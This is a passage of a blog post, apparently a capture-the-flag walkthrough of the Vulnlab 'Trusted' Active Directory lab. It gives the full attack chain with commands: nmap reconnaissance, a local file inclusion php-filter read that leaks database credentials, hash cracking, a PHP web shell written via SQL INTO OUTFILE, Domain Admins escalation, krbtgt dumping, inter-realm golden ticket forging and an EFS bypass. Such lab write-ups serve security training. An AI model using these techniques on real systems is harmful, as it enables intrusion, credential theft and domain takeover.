+<span class="o">|</span><span class="w"> </span><span class="nx">mysql</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Protocol</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">5.5.5</span><span class="o">-</span><span class="m m-Double">10.4.24</span><span class="o">-</span><span class="nx">MariaDB</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Thread</span><span class="w"> </span><span class="nx">ID</span><span class="p">:</span><span class="w"> </span><span class="mi">11</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Capabilities</span><span class="w"> </span><span class="nx">flags</span><span class="p">:</span><span class="w"> </span><span class="mi">63486</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Some</span><span class="w"> </span><span class="nx">Capabilities</span><span class="p">:</span><span class="w"> </span><span class="nx">Support41Auth</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsTransactions</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsCompression</span><span class="p">,</span><span class="w"> </span><span class="nx">Speaks41ProtocolNew</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsLoadDataLocal</span><span class="p">,</span><span class="w"> </span><span class="nx">FoundRows</span><span class="p">,</span><span class="w"> </span><span class="nx">Speaks41ProtocolOld</span><span class="p">,</span><span class="w"> </span><span class="nx">LongColumnFlag</span><span class="p">,</span><span class="w"> </span><span class="nx">IgnoreSigpipes</span><span class="p">,</span><span class="w"> </span><span class="nx">ConnectWithDatabase</span><span class="p">,</span><span class="w"> </span><span class="nx">DontAllowDatabaseTableColumn</span><span class="p">,</span><span class="w"> </span><span class="nx">ODBCClient</span><span class="p">,</span><span class="w"> </span><span class="nx">IgnoreSpaceBeforeParenthesis</span><span class="p">,</span><span class="w"> </span><span class="nx">InteractiveClient</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsMultipleResults</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsMultipleStatments</span><span class="p">,</span><span class="w"> </span><span class="nx">SupportsAuthPlugins</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Status</span><span class="p">:</span><span class="w"> </span><span class="nx">Autocommit</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nx">f</span><span class="err">@</span><span class="nx">M</span><span class="err">@</span><span class="p">&lt;</span><span class="nx">H7z</span><span class="err">$</span><span class="p">?</span><span class="nx">R</span><span class="err">\</span><span class="nx">Z0</span><span class="p">{?</span><span class="nx">eb</span><span class="o">::</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Auth</span><span class="w"> </span><span class="nx">Plugin</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">mysql_native_password</span>
+<span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">rdp</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">LAB</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">LAB</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">LABDC</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">lab</span><span class="p">.</span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">labdc</span><span class="p">.</span><span class="nx">lab</span><span class="p">.</span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">DNS_Tree_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.20348</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System_Time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">26</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">labdc</span><span class="p">.</span><span class="nx">lab</span><span class="p">.</span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">15</span><span class="nx">T08</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">25</span>
+<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">15</span><span class="nx">T08</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">25</span>
+<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">42</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">5</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
+<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">LABDC</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>
+
+<span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">35</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
+<span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span><span class="nx">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">median</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="nx">s</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
+
+<span class="nx">Post</span><span class="o">-</span><span class="nx">scan</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">4</span><span class="nx">s</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="m m-Double">10.10.161.149</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="m m-Double">10.10.161.150</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">Wed</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">48</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">addresses</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="nx">hosts</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">41.11</span><span class="w"> </span><span class="nx">seconds</span>
+</code></pre></div>
+<p>Host <code>10.10.161.150</code> is the DC for the child domain <code>lab.trusted.vl</code>.
+Host <code>10.10.161.149</code> is the DC for the parent domain <code>trusted.vl</code>.</p>
+<p>Add host entries to <code>/etc/hosts</code>:</p>
+<p><img alt="host-entries.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/host-entries.png"/></p>
+<p>Windows host <code>labdc.lab.trusted.vl</code> runs XAMPP on port <code>80</code>. Nothing too interesting is found beside default html pages; a directory bruteforce is then launched as follows: </p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-sma
+ll-directories-lowercase.txt<span class="w"> </span>-u<span class="w"> </span>http://10.10.161.150/
+</code></pre></div>
+<p><img alt="labdc-dir-brute.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-dir-brute.png"/></p>
+<h2 id="labdclabtrustedvl">labdc.lab.trusted.vl</h2>
+<h3 id="foothold">Foothold</h3>
+<p>The path <code>/dev</code> hosts a web page containing an interesting message:</p>
+<p><img alt="labdc-dev.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-dev.png"/></p>
+<p>A php script should be present somewhere; try brute forcing common files;</p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt<span class="w"> </span>-u<span class="w"> </span>http://10.10.161.150/dev<span class="w"> </span>
+</code></pre></div>
+<p><img alt="labdc-file-brute.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-file-brute.png"/></p>
+<p>File <code>db.php</code> is found but it seems to do nothing interesting:</p>
+<p><img alt="labdc-db-php.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-db-php.png"/></p>
+<p>Navigate trough the site it seems that parameter <code>view</code> is used to load html pages:</p>
+<p><img alt="labdc-view-param.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-view-param.png"/></p>
+<p>Trying inserting a not-existing page, a php error is returned leaking the usage of the <code>include</code> function:</p>
+<p><img alt="labdc-view-include.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-view-include.png"/></p>
+<p>Abuse this function to exfiltrate <code>db.php</code> using php filters:</p>
+<p><img alt="labdc-lfi-php-filter.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-lfi-php-filter.png"/></p>
+<p>Filter is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="x">php://filter/read=convert.base64.encode/resource=db.php</span>
+</code></pre></div>
+<p>The content of <code>db.php</code> is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"SuperSecureMySQLPassw0rd1337."</span><span class="p">;</span>
+
+<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s2">"Connected successfully"</span><span class="p">;</span>
+</code></pre></div>
+<p>Use <code>mysql</code> to connect to the remote database:</p>
+<div class="highlight"><pre><span></span><code>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.161.150<span class="w"> </span>-p
+mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.161.150<span class="w"> </span>-p<span class="w"> </span>--disable-ssl-verify-server-cert
+</code></pre></div>
+<p><img alt="labdc-mysql-client.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-mysql-client.png"/></p>
+<p><strong>Note</strong>: use <code>--disable-ssl-verify-server-cert</code> flag to skip certificate validation for TLS.</p>
+<h3 id="credentials-harvesting">Credentials Harvesting</h3>
+<p>In the database <code>news</code> is present the table <code>users</code> containing some users and password md5 hashes:</p>
+<p><img alt="labdc-db-passwords.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-db-passwords.png"/></p>
+<p>Dump users and password hashes with a better format:</p>
+<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="n">short_handle</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="err">\</span><span class="k">G</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="labdc-db-passwords-formatted.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-db-passwords-formatted.png"/></p>
+<p>Dumped users and hashes are:</p>
+<div class="highlight"><pre><span></span><code><span class="n">rsmith</span><span class="o">:</span><span class="mi">7</span><span class="n">e7abb54bbef42f0fbfa3007b368def7</span>
+<span class="n">ewalters</span><span class="o">:</span><span class="n">d6e81aeb4df9325b502a02f11043e0ad</span>
+<span class="n">cpowers</span><span class="o">:</span><span class="n">e3d3eb0f46fe5d75eed8d11d54045a60</span>
+</code></pre></div>
+<p>Try cracking hashes using rainbow tables:</p>
+<p><img alt="labdc-crackstation.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-crackstation.png"/></p>
+<p>Recoverd password <code>IHateEric2</code> for user <code>rsmith</code>.</p>
+<p>Confirm that found usernames do exist in the DC:</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="o">=</span><span class="s2">"krb5-enum-users.realm='lab.trusted.vl',userdb=usernames.txt"</span><span class="w"> </span><span class="m">10</span>.10.161.150
+</code></pre></div>
+<p><img alt="labdc-confirm-users.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-confirm-users.png"/></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Found user <code>rsmith</code> does not have any particular privilege neither access to the DC (RDP, WMI or via SMB).</p>
+<p>It's possible to abuse access to the database in order to upload a php reverse shell by running the following query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'C:\\xampp\\htdocs\\dev\\shell.php'</span>
+</code></pre></div>
+<p>Check user running XAMPP:</p>
+<p><img alt="labdc-revshell.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-revshell.png"/></p>
+<p>Check if it's possible to run powershell commands and that ActiveDirectory module is enabled:</p>
+<div class="highlight"><pre><span></span><code>http://10.10.161.150/dev/shell.php?cmd=powershell%20-c%20%22Get-ADGroupMember%20-Identity%20%20%27Domain%20Admins%27%20%22
+</code></pre></div>
+<p><img alt="labdc-confirm-ad-mdoule.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-confirm-ad-mdoule.png"/></p>
+<p>Having elevated user <code>nt authority\system</code>, it's possible to elevate privileges for <code>rmsith</code> by adding him to <code>Domain Admins</code> group with the following request:</p>
+<div class="highlight"><pre><span></span><code>http://10.10.161.150/dev/shell.php?cmd=powershell -c "Add-ADGroupMember -Identity%20 'Domain Admins' -Members 'rsmith' "
+</code></pre></div>
+<p><img alt="labdc-add-domain-admin.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-add-domain-admin.png"/></p>
+<p>Confirm that <code>rsmith</code> is now domain administrator:</p>
+<p><img alt="labdc-confirm-da.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-confirm-da.png"/></p>
+<h2 id="trusteddctrustedvl_1">trusteddc.trusted.vl</h2>
+<h3 id="child-to-parent-privilege-escalation">Child to Parent Privilege Escalation</h3>
+<p>With elevated privileges, it's not possible to open an interactive shell:</p>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-u<span class="w"> </span>rsmith<span class="w"> </span>-p<span class="w"> </span>IHateEric2<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.161.150<span class="w"> </span>
+</code></pre></div>
+<p>Try getting user flag located at <code>C:\Users\ewalters\Desktop</code> (but get trolled, lol):</p>
+<p><img alt="labdc-fake-user-flag.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-fake-user-flag.png"/></p>
+<p>Real user flag is located at <code>C:\Users\Administrator\Desktop</code>:</p>
+<p><img alt="labdc-user-flag.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-user-flag.png"/></p>
+<p>Enumerate trusts for current DC:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
+</code></pre></div>
+<p><img alt="labdc-trusts.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-trusts.png"/></p>
+<p>A bidirectional trust between <code>lab.trusted.vl</code> and <code>trusted.vl</code> exists. This could be abused to forge an inter-realm golden ticket and obtain access as administrator to the parent domain. </p>
+<p>Firstly, recover both child and parent domains SIDs: </p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.161.150<span class="w"> </span>-d<span class="w"> </span>lab.trusted.vl<span class="w"> </span>-u<span class="w"> </span>rsmith<span class="w"> </span>-p<span class="w"> </span>IHateEric2<span class="w"> </span>--get-sidnxc<span class="w"> </span>
+nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.161.149<span class="w"> </span>-d<span class="w"> </span>lab.trusted.vl<span class="w"> </span>-u<span class="w"> </span>rsmith<span class="w"> </span>-p<span class="w"> </span>IHateEric2<span class="w"> </span>--get-sid
+</code></pre></div>
+<p><img alt="dump-sids.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/dump-sids.png"/></p>
+<p>Use <code>impacket</code>'s <code>secretsdump</code> to dump <code>krbtgt</code>'s NT hash:</p>
+<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>lab.trusted.vl/rsmith@10.10.161.150
+</code></pre></div>
+<p><img alt="labdc-secretsdump.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-secretsdump.png"/></p>
+<p>Use SIDs and  <code>krbtgt</code>'s hash to forge the golden ticket as follows:</p>
+<div class="highlight"><pre><span></span><code>impacket-ticketer<span class="w"> </span>-domain<span class="w"> </span>lab.trusted.vl<span class="w"> </span>-domain-sid<span class="w"> </span>S-1-5-21-2241985869-2159962460-1278545866<span class="w"> </span>-extra-sid<span class="w"> </span>S-1-5-21-3576695518-347000760-3731839591-519<span class="w"> </span>-nthash<span class="w"> </span>c7a03c565c68c6fac5f8913fab576ebd<span class="w"> </span>Administrator
+</code></pre></div>
+<p><img alt="labdc-golden-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/labdc-golden-ticket.png"/></p>
+<p>Use forget ticket to open a shell on parent DC:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+impacket-psexec<span class="w"> </span>-k<span class="w"> </span>lab.trusted.vl/Administrator@trusteddc.trusted.vl<span class="w"> </span>-no-pass
+</code></pre></div>
+<p><img alt="trusteddc-shell.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/trusteddc-shell.png"/></p>
+<h3 id="efs-encryption-bypass">EFS Encryption Bypass</h3>
+<p>Trying access the root flag but Windows returns <code>Access is denied</code>. This is due EFS encryption on the <code>C:\Users\Administrator\Desktop</code> files as showed below:</p>
+<p><img alt="trusteddc-root-flag-inaccessible.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/trusteddc-root-flag-inaccessible.png"/></p>
+<p>Try decrypting the flag file with current cmd session is unsuccessful since the private key (the encryption certificate) it's not present:</p>
+<div class="highlight"><pre><span></span><code>cipher.exe /d root.txt
+</code></pre></div>
+<p><img alt="trusteddc-fail-to-decrypt.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/trusteddc-fail-to-decrypt.png"/></p>
+<p>After switching to <code>evil-winrm</code> (yeah, lazy ass), upload <code>RunasCs.exe</code> on the machine and setting password to <code>Password123!</code> for <code>Administrator</code>, run the following command to obtain the flag content:</p>
+<div class="highlight"><pre><span></span><code>net user Administrator Password123!
+</code></pre></div>
+<p><img alt="trusteddc-change-administrator-password.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/trusteddc-change-administrator-password.png"/></p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">Administrator</span> <span class="n">Password123</span><span class="p">!</span> <span class="s2">"cmd /c type C:\Users\Administrator\Desktop\root.txt"</span>
+</code></pre></div>
+<p><img alt="trusteddc-runascs.png" src="https://ojack69.github.io/jacks-corner/images/ctf/vulnlab/chains/trusted/trusteddc-runascs.png"/></p>
+<p>RunasCS will execute the command as the <code>Administrator</code> user, having therefore its EFS encryption certificate loaded.</p>
+<p><strong>Note</strong>: starting a psexec session with <code>Administrator</code> won't work since the full user profile it's not loaded (the certificate should have been imported manually).</p>
+<p>Another way to bypass the encryption would have been starting an RDP session; this, however, required to disable the Restricted Admin mode.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
